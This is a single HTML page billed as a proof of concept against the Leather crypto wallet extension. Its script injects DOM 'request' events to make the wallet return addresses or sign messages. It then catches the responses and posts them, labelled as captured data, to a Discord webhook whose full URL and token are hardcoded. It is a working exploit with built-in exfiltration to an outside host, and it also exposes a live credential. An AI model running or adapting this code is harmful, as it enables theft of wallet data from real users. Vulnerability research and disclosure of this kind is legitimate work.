<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Leather Wallet PoC - Discord Integration</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            max-width: 700px;
            width: 100%;
            padding: 40px;
        }
        
        h1 {
            color: #333;
            margin-bottom: 10px;
            text-align: center;
        }
        
        .subtitle {
            color: #666;
            text-align: center;
            margin-bottom: 30px;
        }
        
        .config-section {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .config-section h3 {
            color: #333;
            margin-bottom: 15px;
            font-size: 16px;
        }
        
        input {
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 14px;
            font-family: monospace;
            transition: border-color 0.3s;
        }
        
        input:focus {
            outline: none;
            border-color: #667eea;
        }
        
        .button-group {
            display: grid;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 25px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
        }
        
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
        }
        
        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        
        .log-container {
            background: #1e1e1e;
            border-radius: 10px;
            padding: 20px;
            max-height: 300px;
            overflow-y: auto;
        }
        
        .log-container h3 {
            color: #4CAF50;
            margin-bottom: 15px;
            font-size: 16px;
        }
        
        .log-entry {
            color: #d4d4d4;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            line-height: 1.6;
            margin-bottom: 8px;
            padding: 8px;
            background: #2d2d2d;
            border-radius: 5px;
        }
        
        .log-entry.success {
            border-left: 3px solid #4CAF50;
        }
        
        .log-entry.error {
            border-left: 3px solid #f44336;
            color: #ffcdd2;
        }
        
        .log-entry.info {
            border-left: 3px solid #2196F3;
        }
        
        .timestamp {
            color: #888;
            margin-right: 10px;
        }
        
        .status {
            display: inline-block;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 12px;
            font-weight: bold;
            margin-left: 10px;
        }
        
        .status.online {
            background: #4CAF50;
            color: white;
        }
        
        .status.offline {
            background: #f44336;
            color: white;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔓 Leather Wallet PoC</h1>
        <p class="subtitle">DOM Event Injection with Discord Webhook</p>
        
        <div class="config-section">
            <h3>⚙️ Discord Webhook Configuration</h3>
            <input 
                type="text" 
                id="webhookUrl" 
                placeholder="https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"
                value="">
            <p style="margin-top: 10px; font-size: 12px; color: #666;">
                Get your webhook: Discord Server → Channel Settings → Integrations → Webhooks
            </p>
        </div>
        
        <div class="button-group">
            <button onclick="testWebhook()">🧪 Test Webhook Connection</button>
            <button onclick="exploitGetAddresses()">📍 Exploit: Get Addresses</button>
            <button onclick="exploitSignMessage()">✍️ Exploit: Sign Message</button>
            <button onclick="exploitWithWebhook()">🚀 Full Exploit + Send to Discord</button>
        </div>
        
        <div class="log-container">
            <h3>📊 Activity Log <span id="webhookStatus" class="status offline">Webhook Not Configured</span></h3>
            <div id="log"></div>
        </div>
    </div>

    <script>
        // ============================================
        // 🔧 CONFIGURATION - EDIT WEBHOOK URL HERE!
        // ============================================
        const DISCORD_WEBHOOK = 'https://discordapp.com/api/webhooks/1436328098105659475/BF6k132AhabUEVgB5OBudx3kYnSqGgKq6ySyXBlDIxNWUBDHVabANLNIWrulUYiRq5FT';
        // ============================================
        
        // Configuration
        const CONFIG = {
            WEBHOOK_URL: DISCORD_WEBHOOK, // Auto-loaded from above
            LEATHER_DETECTED: false
        };
        
        // Logging utility
        function log(message, type = 'info') {
            const logDiv = document.getElementById('log');
            const entry = document.createElement('div');
            entry.className = `log-entry ${type}`;
            
            const timestamp = new Date().toLocaleTimeString();
            entry.innerHTML = `<span class="timestamp">[${timestamp}]</span>${message}`;
            
            logDiv.appendChild(entry);
            logDiv.scrollTop = logDiv.scrollHeight;
        }
        
        // Update webhook status
        function updateWebhookStatus() {
            const status = document.getElementById('webhookStatus');
            const url = document.getElementById('webhookUrl').value;
            
            // Accept both discord.com and discordapp.com
            if (url && (url.includes('discord.com/api/webhooks') || url.includes('discordapp.com/api/webhooks'))) {
                status.className = 'status online';
                status.textContent = 'Webhook Configured';
                CONFIG.WEBHOOK_URL = url;
            } else {
                status.className = 'status offline';
                status.textContent = 'Webhook Not Configured';
                CONFIG.WEBHOOK_URL = '';
            }
        }
        
        // Listen for webhook input changes
        document.getElementById('webhookUrl').addEventListener('input', updateWebhookStatus);
        
        // Send data to Discord
        async function sendToDiscord(data) {
            if (!CONFIG.WEBHOOK_URL) {
                log('⚠️ Discord webhook not configured', 'error');
                return false;
            }
            
            log('🔍 Webhook URL: ' + CONFIG.WEBHOOK_URL.substring(0, 50) + '...', 'info');
            log('📦 Data to send: ' + JSON.stringify(data).substring(0, 100) + '...', 'info');
            
            const embed = {
                title: '🎯 Leather Wallet PoC - Data Captured',
                color: 0xff0000,
                fields: [
                    {
                        name: '🌐 Source URL',
                        value: window.location.href,
                        inline: false
                    },
                    {
                        name: '🕐 Timestamp',
                        value: new Date().toISOString(),
                        inline: true
                    },
                    {
                        name: '📦 Data Type',
                        value: data.type || 'Unknown',
                        inline: true
                    },
                    {
                        name: '📊 Captured Data',
                        value: '```json\n' + JSON.stringify(data.data, null, 2).substring(0, 900) + '\n```',
                        inline: false
                    }
                ],
                timestamp: new Date().toISOString(),
                footer: {
                    text: 'Leather Wallet PoC'
                }
            };
            
            try {
                log('📤 Sending data to Discord...', 'info');
                
                const response = await fetch(CONFIG.WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        username: 'Leather PoC',
                        avatar_url: 'https://leather.io/favicon.ico',
                        embeds: [embed]
                    })
                });
                
                log(`📡 Response status: ${response.status}`, response.ok ? 'success' : 'error');
                
                if (response.ok) {
                    log('✅ Data successfully sent to Discord!', 'success');
                    log('💬 Check your Discord channel now!', 'success');
                    return true;
                } else {
                    const errorText = await response.text();
                    log(`❌ Discord webhook failed: ${response.status}`, 'error');
                    log(`❌ Error details: ${errorText}`, 'error');
                    return false;
                }
            } catch (error) {
                log(`❌ Error sending to Discord: ${error.message}`, 'error');
                console.error('Full error:', error);
                return false;
            }
        }
        
        // Test webhook connection
        async function testWebhook() {
            const url = document.getElementById('webhookUrl').value;
            
            if (!url) {
                log('❌ Please enter a Discord webhook URL', 'error');
                return;
            }
            
            log('🧪 Testing webhook connection...', 'info');
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: '✅ Webhook test successful! Your PoC is ready.',
                        username: 'Leather PoC Test'
                    })
                });
                
                if (response.ok) {
                    log('✅ Webhook is working! Check your Discord channel.', 'success');
                    updateWebhookStatus();
                } else {
                    log(`❌ Webhook test failed: ${response.status}`, 'error');
                }
            } catch (error) {
                log(`❌ Connection error: ${error.message}`, 'error');
            }
        }
        
        // Dispatch malicious event
        function dispatchExploit(method, params = {}) {
            const requestId = Math.random().toString(36).substring(7);
            
            const request = {
                method: method,
                id: requestId,
                params: params,
                jsonrpc: '2.0'
            };
            
            log(`🚀 Dispatching exploit: ${method}`, 'info');
            
            try {
                document.dispatchEvent(
                    new CustomEvent('request', { 
                        detail: request 
                    })
                );
                log(`✅ Event dispatched (ID: ${requestId})`, 'success');
                return requestId;
            } catch (error) {
                log(`❌ Dispatch failed: ${error.message}`, 'error');
                return null;
            }
        }
        
        // Exploit 1: Get Addresses
        function exploitGetAddresses() {
            log('🎯 Exploit: Requesting wallet addresses', 'info');
            dispatchExploit('getAddresses', {});
            log('👀 Check for Leather wallet popup...', 'info');
        }
        
        // Exploit 2: Sign Message
        function exploitSignMessage() {
            log('🎯 Exploit: Requesting message signature', 'info');
            dispatchExploit('signMessage', {
                message: 'PoC test message',
                paymentType: 'p2wpkh'
            });
            log('👀 Check for Leather wallet popup...', 'info');
        }
        
        // Full exploit with webhook
        async function exploitWithWebhook() {
            // Re-check webhook status
            updateWebhookStatus();
            
            if (!CONFIG.WEBHOOK_URL) {
                log('❌ Please configure Discord webhook first', 'error');
                log('⚠️ Enter webhook URL in the field above', 'error');
                return;
            }
            
            log('🚀 Starting full exploit sequence...', 'info');
            log('🔗 Webhook: ' + CONFIG.WEBHOOK_URL.substring(0, 50) + '...', 'info');
            log('📍 Dispatching getAddresses request...', 'info');
            
            // Dispatch the exploit
            dispatchExploit('getAddresses', {});
            
            log('⏳ Waiting for user to approve in wallet popup...', 'info');
            log('💡 Real addresses will be captured when user approves', 'info');
            log('📊 Data will be automatically sent to Discord', 'success');
        }
        
        // Listen for wallet responses - THIS CAPTURES REAL DATA
        window.addEventListener('message', (event) => {
            // Debug: log all messages
            if (event.data) {
                console.log('Message received:', event.data);
            }
            
            // Check multiple response formats
            const data = event.data;
            
            // Format 1: source: 'stacks-wallet'
            if (data && data.source === 'stacks-wallet' && data.result) {
                log('📨 Wallet response (format 1) received!', 'success');
                sendCapturedData(data.result, data.method);
                return;
            }
            
            // Format 2: jsonrpc with result (common format)
            if (data && data.jsonrpc === '2.0' && data.result) {
                log('📨 Wallet response (format 2) received!', 'success');
                console.log('Full response:', data);
                sendCapturedData(data.result, 'wallet_response');
                return;
            }
            
            // Format 3: Has result field directly
            if (data && data.result && typeof data.result === 'object') {
                log('📨 Wallet response (format 3) received!', 'success');
                console.log('Full response:', data);
                sendCapturedData(data.result, 'wallet_response');
                return;
            }
        });
        
        // Helper function to send captured data
        function sendCapturedData(result, method) {
            log('✅ Real data captured from wallet!', 'success');
            log('📊 Data: ' + JSON.stringify(result).substring(0, 100) + '...', 'info');
            
            // Send REAL data to Discord
            if (CONFIG.WEBHOOK_URL) {
                const realData = {
                    type: method || 'wallet_response',
                    data: {
                        ...result,
                        exploitMethod: 'DOM Event Injection',
                        vulnerability: 'src/content-scripts/content-script.ts:61-63',
                        timestamp: new Date().toISOString()
                    }
                };
                
                log('📤 Sending REAL data to Discord...', 'info');
                sendToDiscord(realData);
            } else {
                log('❌ Webhook not configured, cannot send data', 'error');
            }
        }
        
        // Check for Leather Wallet
        setTimeout(() => {
            if (window.LeatherProvider) {
                CONFIG.LEATHER_DETECTED = true;
                log('✅ Leather Wallet detected - Ready for testing', 'success');
            } else {
                log('⚠️ Leather Wallet not detected', 'error');
                log('Please install Leather Wallet extension to test', 'info');
            }
        }, 1000);
        
        // Initialize
        log('🔍 PoC initialized', 'info');
        
        // Sync input field with hardcoded webhook
        if (DISCORD_WEBHOOK && DISCORD_WEBHOOK !== '') {
            document.getElementById('webhookUrl').value = DISCORD_WEBHOOK;
        }
        
        // IMPORTANT: Auto-load webhook from input field on page load
        // This runs immediately to detect pre-filled webhook URL
        updateWebhookStatus();
        
        setTimeout(() => {
            if (CONFIG.WEBHOOK_URL) {
                log('✅ Discord webhook configured and ready!', 'success');
                log('🚀 You can now run exploits', 'success');
            } else {
                log('⚙️ Configure Discord webhook above to start', 'info');
            }
        }, 500);
    </script>
</body>
</html>
